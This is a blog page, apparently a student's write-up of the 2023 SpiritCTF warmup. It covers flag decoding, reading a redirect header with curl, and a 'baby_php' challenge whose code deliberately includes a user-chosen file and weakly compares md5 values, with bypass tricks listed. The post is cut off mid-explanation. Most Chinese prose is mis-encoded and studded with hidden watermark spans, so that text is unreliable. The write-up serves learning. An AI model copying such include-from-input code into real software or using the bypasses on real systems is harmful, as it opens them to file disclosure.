<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="s3ven" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <meta property="og:site_name" content="s3ven&#39;s blog">
  
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  
  
  <title>2023 SpiritCTF Warmup WriteUp | s3ven&#39;s blog</title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Font -->
  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="../../js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">s3ven's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/links/">
          <a href="/links/">Links</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="../../js/activeNav.js"></script>



      <div class="flex-container">
        
  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="../../js/codeCopy.js"></script>







  

  

  

  
  <div class="container-wider post-details" id="post-details">
    <div class="zoom-wrap">
      <div class="post-content">
        <div class="post-title">2023 SpiritCTF Warmup WriteUp</div>
        <div class="post-attach">
          <span class="post-pubtime">
            <i class="iconfont icon-updatetime mr-10" title="åˆ›å»ºæ—¶é—´"></i>
            2023-10-17
          </span>
          
                <span class="post-categories">
                  <i class="iconfont icon-bookmark mr-10" title="åˆ†ç±»"></i>
                  
                  <span class="span--category">
                    <a href="../../categories/write-up/" title="Write Up">
                      Write Up
                    </a>
                  </span>
                  
                </span>
            
                <span class="post-tags">
                  <i class="iconfont icon-tags mr-10" title="æ ‡ç­¾"></i>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/php/" title="PHP">
                      #PHP
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/sql/" title="SQL">
                      #SQL
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/python/" title="Python">
                      #Python
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/c/" title="C#">
                      #C#
                    </a>
                  </span>
                  
                </span>
            
        </div>
        <div class="markdown-body">
          
<style id="hexo-wm">
.hexo-wm {
  color: transparent !important;
  opacity: 0 !important;
  font-size: 0 !important;
  line-height: 0 !important;
  pointer-events: none !important;
  user-select: text !important;
  -webkit-user-select: text !important;
  speak: none !important;
  vertical-align: baseline !important;
  display: inline !important;
}

.hexo-wm * { color: transparent !important; opacity: 0 !important; }
</style>
<html><head></head><body><h1 id="æ¯”èµ›ä»‹ç»"><a href="#æ¯”èµ›ä»‹ç»" class="headerlink" title="æ¯”èµ›ä»‹ç»"></a>æ¯”èµ›ä»‹ç»</h1><blockquote>
<p>2023 SpiritCTF Warmup <span class="hexo-wm">êœ±â€‹Â³â…´â„¯ğ§â€¢â€ğ¬ğ˜ªâ€Œtï½…â€‹</span>ä¸º 2023 SpiritCTF çƒ­èº«èµ›<br>å±äº å‰æ—å¤§å­¦â€œå±±çŸ³ç½‘ç§‘â€æ¯ç¬¬äº”å±Š<span class="hexo-wm">sâ€â€Â³â…´â„¯ğ’ï¼â€Œğ˜€â…ˆâ€Œï»¿ğ­ï½…ï»¿â€Œ</span>å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ› ç³»åˆ—èµ›äº‹<br>æ¯”èµ›æ—¶é—´ä¸º 2023/9/5 - 2023/10/17</p>
</blockquote>
<h1 id="çƒ­èº«èµ›ä¸æ­£èµ›"><a href="#çƒ­èº«èµ›ä¸æ­£èµ›" class="headerlink" title="çƒ­èº«èµ›ä¸æ­£èµ›"></a>çƒ­èº«èµ›ä¸æ­£èµ›</h1><ul>
<li>çƒ­èº«èµ›é¢˜ç›®åŒ…æ‹¬ä½†ä¸é™äºå„ä¸ªæ–¹å‘çš„å…¥é—¨é¢˜ç›®ã€ä¸æœ¬æ¬¡ 2023 <span class="hexo-wm">ğ¬â€â‘¶ğ˜·ğ˜¦ğ˜¯âˆ™â€Œâ€‹ğ˜´ï½‰â€ï½”eâ€</span>SpiritCTF éš¾åº¦ç›¸å½“çš„é¢˜ç›®ã€å¾€å¹´SpiritCTFï¼ˆæ ¡èµ›ï¼‰çš„é¢˜ç›®ï¼Œç”¨äºå¸®åŠ©å¤§å®¶æœ‰é’ˆå¯¹æ€§çš„å…¥é—¨</li>
<li>çƒ­èº«èµ›æœŸé—´æˆç»©çªå‡ºçš„åŒå­¦å°†è¢«å®šå‘é‚€è¯·è‡³ 2023 SpiritCTF çº¿ä¸‹èµ›åœºï¼ˆæ³¨ï¼šçº¿ä¸‹èµ›åœºä¸çº¿ä¸Šèµ›åœºé‡‡ç”¨åŒæ ·çš„æ¯”èµ›åœ°å€è§£ç­”ç›¸åŒé¢˜ç›®ï¼Œä¸è¿‡çº¿ä¸‹èµ›åœºæ›´èƒ½ä½“ä¼šåˆ° CTF <span class="hexo-wm">ğ˜´â€‹â€ŒÂ³vï½…ï½.ï»¿â€ğ˜´ğ˜ªâ€â€‹ğ˜µğâ€‹ï»¿</span>çš„æ¯”èµ›æ°›å›´ï¼Œå¹¶ä¸”å…¥å›´çº¿ä¸‹èµ›åœºçš„åŒå­¦å¯ä»¥è·å¾— Spirit æˆ˜é˜Ÿçš„ç²¾ç¾å‘¨è¾¹ï¼‰</li>
<li>çº¿ä¸‹èµ›åœºåé¢ä¸Šé™ä¸º 45 ï¼Œçƒ­èº«èµ›æ€»æ¦œé å‰ã€<span class="hexo-wm">ğ’”â€‹â€‹3ğ˜·ğğ˜¯âˆ™â€‹ğ’”ğ¢â€ï½”ğâ€Œ</span>è§£å‡ºæŸé“éš¾åº¦è¾ƒé«˜çƒ­èº«èµ›é¢˜ç»™å‡ºé¢˜äººç•™ä¸‹æ·±åˆ»å°è±¡éƒ½æœ‰å¯èƒ½è¢«å®šå‘é‚€è¯·åˆ°çº¿ä¸‹èµ›åœº</li>
<li>æ­£èµ›äºåæœˆä¸‹æ—¬å¼€å§‹ï¼Œ<span class="hexo-wm">ğ˜´â€‹ğŸ¯ğ’—ï½…nâ€¢â€siâ€Œâ€ğ’•eï»¿</span>æ¨¡å¼ä¸ºç»„é˜Ÿèµ›ï¼ˆä¸‰äººä¸€é˜Ÿï¼‰</li>
</ul>
<h1 id="Signin1"><a href="#Signin1" class="headerlink" title="Signin1"></a>Signin1</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>App1e_Treeåœ¨èµ›å‰ä¸ƒå¤©å€’è®¡æ—¶æµ·æŠ¥ä¸­çš„ä¸‰å¼ ä½¿ç”¨ä¸åŒç¼–ç éšè—äº†ä¸€ä¸ªflagï¼Œä½ èƒ½æ‰¾åˆ°å®ƒä¹ˆï¼<br>è¯·ç§»æ­¥SpiritGame <span class="hexo-wm">sï»¿â€ŒğŸ¯ğ’—eğ˜¯ï¼ï»¿â€Œğ’”ğ˜ªï»¿â€‹tï½…â€‹</span>2023èµ›äº‹ç¾¤ <span class="hexo-wm">ğ’”â€Œ3veğ˜¯Â·â€Œsiâ€Œtâ„®â€â€</span>143102236 ç²¾åæ¶ˆæ¯ä¸­è·å–æµ·æŠ¥ï¼Œå…³æ³¨æ¯”èµ›å®æ—¶åŠ¨æ€ï¼</p>
</blockquote>
<p>ä¸‰å¼ æµ·æŠ¥ä¸­ä¸­å«<span class="hexo-wm">sâ€3vğ˜¦ï½âˆ™â€‹ğ˜€iâ€Œï½”ğï»¿â€Œ</span>æœ‰çš„ä¿¡æ¯å¦‚ä¸‹</p>
<p>1.ä»…å‰©2å¤©æµ·æŠ¥</p>
<blockquote>
<p>Spirit{that_1s<span class="hexo-wm">ğ’”â€‹â‘¶ğ’—â„¯ï½â€¢â€Ñ•ğ¢ï»¿ğ˜µğâ€‹</span>_the_fun_0f_ctf_</p>
</blockquote>
<p>2.ä»…å‰©4å¤©æµ·æŠ¥</p>
<blockquote>
<p>5F396F30645F6C7<span class="hexo-wm">Ñ•â€â€â‘¶ğ¯ğ˜¦ğ˜¯.â€Œâ€ğ˜´â…ˆâ€ğ’•ğ˜¦â€Œï»¿</span>5636B5F747730<span class="hexo-wm">sâ€‹â€Œ3â…´â„®n.â€‹ï»¿Ñ•ï½‰â€Œğ­ğ˜¦ï»¿â€Œ</span>5F755F62795F30766572663130777D</p>
</blockquote>
<p>3.ä»…å‰©7å¤©æµ·æŠ¥</p>
<blockquote>
<p>\u006e\u0065\u0076\u0065\u0072\u005f\<span class="hexo-wm">Ñ•â€Œï»¿Â³vğ˜¦nÂ·<span class="hexo-wm">ğ’”â€ŒÂ³ğ’—ï½…ğ§âˆ™â€êœ±ğ¢â€‹ğ’•eâ€Œ</span>â€â€‹ğ¬ğ¢â€Œï½”ğâ€‹â€Œ</span>u0067\u0031\u0076\u0065\u005f\u0075\u0070</p>
</blockquote>
<p>æ ¹æ®ä¿¡æ¯å†…å®¹åˆ¤æ–­</p>
<ul>
<li>1 ä¸ºæ˜æ–‡</li>
<li>2 ä¸ºå­—ç¬¦å¯†æ–‡</li>
<li>3 ä¸ºunicodeå¯†æ–‡</li>
</ul>
<p>1 ä¸ºæ˜æ–‡ï¼Œå³æœ‰</p>
<pre class="language-none"><code class="language-none">Spirit{that_1s_the_fun_0f_ctf_</code></pre>
<p>2 é€šè¿‡ <a href="https://www.toolhelper.cn/EncodeDecode/EncodeDecode">å­—ç¬¦åœ¨çº¿åŠ è§£å¯†å·¥å…·</a> è§£å¯†åè·å¾—</p>
<pre class="language-none"><code class="language-none">_9o0d_luck_tw0_u_by_0verf10w}</code></pre>
<p>3 é€šè¿‡ <a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChineseEncodeDecode">Unicodeåœ¨<span class="hexo-wm">êœ±â€ï»¿ğŸ¯vâ„¯ğ˜¯.ï»¿â€ğ˜´iâ€Œâ€Œğ˜µâ„®â€Œâ€Œ</span>çº¿åŠ è§£å¯†å·¥å…·</a> è§£å¯†åè·å¾—</p>
<pre class="language-none"><code class="language-none">never_g1ve_up</code></pre>
<p>æ ¹æ® <code>flag</code> æ ¼å¼ <code>Spirit{xxxx}</code> æ¨æµ‹åº”ä¸º132ç»„åˆ</p>
<p>Flag:</p>
<pre class="language-none"><code class="language-none">Spirit{that_1s_the_fun_0f_ctf_never_g1ve_up_9o0d_luck_tw0_u_by_0verf10w}</code></pre>

<h1 id="Signin2"><a href="#Signin2" class="headerlink" title="Signin2"></a>Signin2</h1><p>çº¯çº¯ç­¾åˆ°é¢˜</p>
<p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>Welcome to <a href="mailto:web@spirit2023.ctf">web@spirit2023.ctf</a>~</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åå‘ç°æœ‰ä¸€ä¸ª <code>Get Your Flag</code> æŒ‰é’®</p>
<p><img src="image-1.png" alt="image-1.png"></p>
<p>ç„¶è€Œç‚¹å‡»åæ²¡æœ‰ä»€ä¹ˆååº”ï¼ˆï¼Ÿï¼‰</p>
<h2 id="1-æ–¹æ³•ä¸€ï¼šDevTools-curl"><a href="#1-æ–¹æ³•ä¸€ï¼šDevTools-curl" class="headerlink" title="1. æ–¹æ³•ä¸€ï¼šDevTools + curl"></a>1. æ–¹æ³•ä¸€ï¼šDevTools + curl</h2><p>F12æ‰“å¼€å¼€å‘äººå‘˜å·¥å…·ï¼Œ<span class="hexo-wm">ğ˜´â€‹â€‹ğŸ¯ğ¯â„¯ï½Â·â€â€ŒÑ•â…ˆâ€Œâ€‹ğ˜µğ˜¦â€Œ</span>è°ƒè‡³ç½‘ç»œé€‰é¡¹å¡ï¼Œå¼€å¯è®°å½•ç½‘ç»œæ—¥å¿—å¹¶åˆ·æ–°é¡µé¢ï¼Œé€‰é¡¹å¡å†…å®¹æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>
<p><img src="image-2.png" alt="image-2.png"></p>
<p>ç‚¹å‡» <code>Get Your Flag</code> æŒ‰é’®åï¼Œç½‘ç»œé€‰é¡¹å¡æ˜¾<span class="hexo-wm">Ñ•â€Â³ğ˜·ğğ˜¯â€¢â€Œğ’”ğ˜ªï»¿â€ï½”â„®â€</span>ç¤ºå†…å®¹å˜åŒ–ä¸ºå¦‚ä¸‹ï¼š</p>
<p><img src="image-3.png" alt="image-3.png"></p>
<p>å‘ç°æ–°å¢äº†ä¸€è¡Œ <code>flag</code> é€šä¿¡åŒ…ï¼Œäºæ˜¯<span class="hexo-wm">sï»¿â€ŒÂ³ğ˜·ï½…ï½âˆ™â€Œï»¿siâ€Œğ˜µeâ€ï»¿</span>æ¨æµ‹è¯¥æŒ‰é’®å‘é€äº† <code>/flag</code> è¯·æ±‚ï¼Œ</p>
<p>å¹¶æ ¹æ®é€‰é¡¹å¡æ˜¾ç¤º<span class="hexo-wm">êœ±â€‹ï»¿ğŸ¯ğ˜·â„¯ï½â€¢ï»¿ğ’”ğ˜ªâ€Œâ€‹ğ’•â„®â€‹</span>å†…å®¹åˆ¤æ–­é¡µé¢ç»è¿‡äº† <code>301é‡å®šå‘</code></p>
<p>äºæ˜¯ä½¿ç”¨ <code>curl</code> å·¥å…·ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/flag</code></pre>
<p>è¿”å›å†…å®¹å¦‚ä¸‹</p>
<pre class="language-none"><code class="language-none">HTTP/1.1 301 Moved Permanently
Flag: U3Bpcml0ezQ4NDY0YzNlLTJhMGQtNDVhNC04NTE4LWFlZTJhZDg5NDM4Y30=
Location: /
Server: Microsoft-NetCore/2.0
Date: xxxxxxx
Transfer-Encoding: chunked</code></pre>
<p>ç”±æ­¤è·å¾—ç»è¿‡åŠ å¯†åçš„ <code>Flag</code> ä¿¡æ¯</p>
<pre class="language-none"><code class="language-none">Flag: U3Bpcml0ezk1YTkyYTkwLTYyMTMtNGRmMC05MjE2LTU4M2YwMGZmMjdlM30=</code></pre>
<h2 id="2-æ–¹æ³•äºŒï¼šBurp-Suite"><a href="#2-æ–¹æ³•äºŒï¼šBurp-Suite" class="headerlink" title="2. æ–¹æ³•äºŒï¼šBurp Suite"></a>2. æ–¹æ³•äºŒï¼šBurp Suite</h2><p>æ‰“å¼€ <code>Burp Suite</code> å¼€å¯æµè§ˆå™¨æµé‡ä»£ç†<br><img src="image-4.png" alt="image-4.png"><br>å‘ç°è¯¥æŒ‰é’®æŒ‡å‘ <code>/flag</code> è·¯å¾„å¹¶è¢«301é‡å®šå‘</p>
<p>åœ¨ <code>/flag</code> è·¯å¾„çš„ <code>Response</code> ä¸­å‘ç° <code>Flag</code> ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">Flag: U3Bpcml0ezk1YTkyYTkwLTYyMTMtNGRmMC05MjE2LTU4M2YwMGZmMjdlM30=</code></pre>
<h2 id="3-Flag-è§£å¯†"><a href="#3-Flag-è§£å¯†" class="headerlink" title="3. Flag è§£å¯†"></a>3. Flag è§£å¯†</h2><p>ç»“åˆè¯¥å­—ç¬¦ä¸²å½¢å¼ï¼Œåˆ¤æ–­flagç»è¿‡äº†Base64åŠ å¯†<br>ä½¿ç”¨<a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64åœ¨çº¿åŠ è§£å¯†å·¥å…·</a><br><img src="image-5.png" alt="image-5.png"><br>å³å¯è·å¾—flagå¦‚ä¸‹</p>
<blockquote>
<p>Spirit{95a92a90-6213-<span class="hexo-wm">ğ˜€â€‹â€Â³â…´eğ§ï¼â€â€<span class="hexo-wm">Ñ•â€ï»¿ğŸ¯ğ’—ï½…nï¼â€‹êœ±ï½‰â€Œâ€‹ğ’•â„®â€</span>êœ±ğ¢â€‹â€‹ğ­â„®â€Œ</span>4df0-9216-583f00ff27e3}</p>
</blockquote>
<h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>\/\/PHPã¯æœ€<span class="hexo-wm">Ñ•â€‹ï»¿3â…´eï½âˆ™ï»¿ğ¬<span class="hexo-wm">ğ˜´ï»¿â€Â³â…´ğ˜¦ğ§.â€Œğ¬ğ˜ªâ€â€‹ğ˜µğ˜¦â€‹</span>ï½‰â€Œâ€Œğ˜µeâ€Œâ€Œ</span>é«˜~\/\/</p>
<p>for hackers</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢å‘ç°é¢˜<span class="hexo-wm">ğ˜´â€Œâ€ŒÂ³veğ’.â€sğ˜ªâ€Œğ˜µğâ€Œ</span>ç›®ç»™å‡ºäº†ä¸€æ®µ<code>php</code>ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna give you up'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna let you down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna run around and desert you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Never gonna make you cry'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna say goodbye'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Never gonna tell a lie and hurt you'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span></code></pre>
<p><del>ä½ è¢«éª—å•¦ï¼ˆè¯¯ï¼‰</del></p>
<p>æ¥ä¸‹æ¥å¯¹ä»£ç çš„å„<span class="hexo-wm">sâ€‹â€ŒğŸ¯â…´eğ’âˆ™ï»¿â€‹Ñ•ï½‰â€Œï»¿ğ­ï½…â€Œï»¿</span>ä¸ªéƒ¨åˆ†è¿›è¡Œåˆ†æ</p>
<h2 id="1-ç¬¬ä¸€éƒ¨åˆ†"><a href="#1-ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="1. ç¬¬ä¸€éƒ¨åˆ†"></a>1. ç¬¬ä¸€éƒ¨åˆ†</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna give you up'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>æ­¤å¤„åˆ¤æ–­æ˜¯å¦é€šè¿‡<code>GET</code>æ–¹å¼ä¼ å…¥ <code>a</code> å’Œ <code>b</code> ä¸¤ä¸ªarg</p>
<p>å¦‚æœä»»æ„ä¸€ä¸ªå‚æ•°æ²¡æœ‰ä¼ å…¥ <span class="hexo-wm">Ñ•ï»¿â€Œâ‘¶ğ¯ğ˜¦ğ˜¯Â·â€‹sğ¢ï»¿â€ğ˜µğ˜¦â€Œ</span>åˆ™ç»ˆæ­¢è¿è¡Œå¹¶æŠ›å‡º</p>
<blockquote>
<p>Never gonna <span class="hexo-wm">ğ˜´â€‹â€ğŸ¯ğ¯â„¯nâˆ™â€Œâ€ŒÑ•â…ˆï»¿ğ­ï½…â€‹</span>give you up</p>
</blockquote>
<p>å› æ­¤å¯ä»¥é€šè¿‡é¡µé¢å›æ˜¾åˆ¤æ–­<span class="hexo-wm">Ñ•â€â€ğŸ¯â…´ğ˜¦ğ’âˆ™â€â€Œğ˜´iâ€Œâ€‹ğ­â„®â€Œ</span>ä»£ç è¿è¡Œåˆ°çš„ä½ç½®</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna let you down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>æ­¤å¤„ä»£ç æ¥æ”¶ <code>a</code> &amp; <code>b</code> ä¸¤ä¸ªargçš„å€¼</p>
<p>å¹¶åªæœ‰åœ¨</p>
<blockquote>
<ul>
<li><code>a</code> ä¸ç­‰äº <code>b</code></li>
<li><code>a</code> çš„MD5å€¼ä¸ <code>b</code> ç›¸ç­‰æ—¶</li>
</ul>
</blockquote>
<p>æ‰èƒ½é€šè¿‡æ£€æµ‹</p>
<p>å¦åˆ™ç»ˆæ­¢è¿è¡Œå¹¶æŠ›å‡º</p>
<blockquote>
<p>Never gonna <span class="hexo-wm">Ñ•â€Œâ‘¶ğ’—ï½…ğ˜¯ï¼â€‹ğ¬<span class="hexo-wm">Ñ•â€Œâ€‹â‘¶vï½…ï½â€¤â€Œâ€ŒÑ•ï½‰â€‹ï»¿teï»¿</span>iâ€‹tâ„®â€â€Œ</span>let you down</p>
</blockquote>
<p>æ­¤å¤„å¸¸è§çš„ç»•è¿‡æ–¹å¼æœ‰ï¼š</p>
<ul>
<li>æ„é€ éå­—ç¬¦ä¸²å‚æ•°ç»•è¿‡ <span class="hexo-wm">ğ¬â€‹ï»¿ğŸ¯ğ’—ğ˜¦ï½Â·â€â€Œêœ±ğ¢ï»¿ğ˜µâ„®â€‹</span>(ä»…é™äºæ—§ç‰ˆæœ¬PHP)</li>
<li>åˆ©ç”¨å¼±ç±»å‹ç‰¹æ€§0eç»•è¿‡</li>
<li>ç›´æ¥ä½¿ç”¨md5ç¢°æ’</li>
</ul>
<h3 id="1-1-æ„é€ éå­—ç¬¦ä¸²å‚æ•°ç»•è¿‡-ä»…é™äºæ—§ç‰ˆæœ¬PHP"><a href="#1-1-æ„é€ éå­—ç¬¦ä¸²å‚æ•°ç»•è¿‡-ä»…é™äºæ—§ç‰ˆæœ¬PHP" class="headerlink" title="1.1 æ„é€ éå­—ç¬¦ä¸²å‚æ•°ç»•è¿‡ (ä»…é™äºæ—§ç‰ˆæœ¬PHP)"></a>1.1 æ„é€ éå­—ç¬¦ä¸²å‚æ•°ç»•è¿‡ (ä»…é™äºæ—§ç‰ˆæœ¬PHP)</h3><blockquote>
<p>å·²çŸ¥æ—§ç‰ˆæœ¬PHPåœ¨è°ƒç”¨ <code>md5</code> å‡½æ•°æ—¶å¦‚æœä¼ å…¥çš„å‚æ•°ä¸ºéå­—ç¬¦ä¸²ç±»å‹ï¼Œä¼šç›´æ¥è¿”å›NULL</p>
</blockquote>
<p>åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€  <code>a</code> å’Œ <code>b</code> ä¸¤ä¸ªä¸åŒçš„éå­—ç¬¦ä¸²å‚æ•°<br>ä½¿å¾—â€NULL=NULLâ€æˆç«‹æ¥ç»•è¿‡è¿™ä¸€æ£€æµ‹</p>
<p>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<span class="hexo-wm">ğ¬â€â€‹Â³ğ˜·â„¯ï½Â·ï»¿â€Œğ’”iâ€Œğ˜µğâ€Œ</span>æ•°ç»„ç±»å‹ç»•è¿‡</p>
<blockquote>
